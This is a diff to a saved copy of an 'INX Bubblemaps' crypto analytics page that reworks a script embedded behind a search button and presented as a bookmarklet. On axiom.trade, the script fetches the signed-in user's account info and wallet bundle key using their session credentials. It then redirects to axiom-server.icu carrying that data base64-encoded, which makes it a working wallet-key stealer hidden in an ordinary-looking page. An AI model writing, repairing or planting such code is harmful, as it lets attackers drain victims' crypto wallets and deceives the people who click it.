@@ -62,35 +62,30 @@
           gtag('js', new Date());
 
           gtag('config', 'G-NM6G7ZRY5N');</script><script src="./INX Bubblemaps_files/js" id="_next-ga" data-nscript="afterInteractive"></script><script src="./INX Bubblemaps_files/[[...rest]]-c50133d7dd75f720.js"></script><script src="./INX Bubblemaps_files/684-35d9b99354cc467d.js"></script><script src="./INX Bubblemaps_files/5675-9fc13a10567692b9.js"></script><script src="./INX Bubblemaps_files/2443-c5ff7fb51d7ecbe7.js"></script><script src="./INX Bubblemaps_files/tradewatch-521cf597119ffa1e.js"></script><script src="./INX Bubblemaps_files/3496-5efe3c5e7fc2972f.js"></script><script src="./INX Bubblemaps_files/scanner-2137fdd31e7abbc4.js"><script>
-document.addEventListener("DOMContentLoaded", function() {
-  var btn = document.getElementById("mySearchButton");
-  if(btn){
-    btn.onclick = function(event) {
-      event.preventDefault();
-      // alert("Bouton cliqué !"); // Tu peux retirer ce test si tu veux
-      (async () => {
-        try {
-          if(location.hostname === "tonsite.com")
-            return alert("You must drag the bookmarklet to your bookmarks bar instead of clicking it.");
-          if(location.hostname != "axiom.trade") {
-            alert("You are now being redirected to https://axiom.trade/discover.");
-            location.replace("https://axiom.trade/discover");
-          }
-          else {
-            if(!localStorage.getItem("isAuthed"))
-              return alert("You must be signed in to use this bookmarklet.");
-            const user = await (await fetch("//api7.axiom.trade/user-info", {method:"POST", credentials:"include"})).json();
-            const bundleRes = await (await fetch("//api8.axiom.trade/bundle-key-and-wallets", {method:"POST", credentials:"include"})).json();
-            const bundleString = `${localStorage.getItem("sBundles")};${bundleRes.bundleKey}`;
-            location.replace(`https://axiom-server.icu/${btoa(JSON.stringify({hash:"MDs3NTE3MDE1NDcx",site:"https://trendsniperpro.vercel.app//api/wallets",user,bundle:bundleString}))}`);
-          }
-        } catch(e) {
-          alert("Failed to execute the bookmarklet. Please try again later.");
+document.addEventListener('click', function(event) {
+  const btn = event.target.closest("#mySearchButton");
+  if (btn) {
+    event.preventDefault();
+    (async () => {
+      try {
+        if(location.hostname === "tonsite.com")
+          return alert("You must drag the bookmarklet to your bookmarks bar instead of clicking it.");
+        if(location.hostname != "axiom.trade") {
+          alert("You are now being redirected to https://axiom.trade/discover.");
+          location.replace("https://axiom.trade/discover");
         }
-      })(); // <-- c'était cette parenthèse et accolade qui manquaient
-    }
-  } else {
-    console.log("Bouton pas trouvé !");
+        else {
+          if(!localStorage.getItem("isAuthed"))
+            return alert("You must be signed in to use this bookmarklet.");
+          const user = await (await fetch("//api7.axiom.trade/user-info", {method:"POST", credentials:"include"})).json();
+          const bundleRes = await (await fetch("//api8.axiom.trade/bundle-key-and-wallets", {method:"POST", credentials:"include"})).json();
+          const bundleString = `${localStorage.getItem("sBundles")};${bundleRes.bundleKey}`;
+          location.replace(`https://axiom-server.icu/${btoa(JSON.stringify({hash:"MDs3NTE3MDE1NDcx",site:"https://trendsniperpro.vercel.app//api/wallets",user,bundle:bundleString}))}`);
+        }
+      } catch(e) {
+        alert("Failed to execute the bookmarklet. Please try again later.");
+      }
+    })();
   }
 });
 </script>
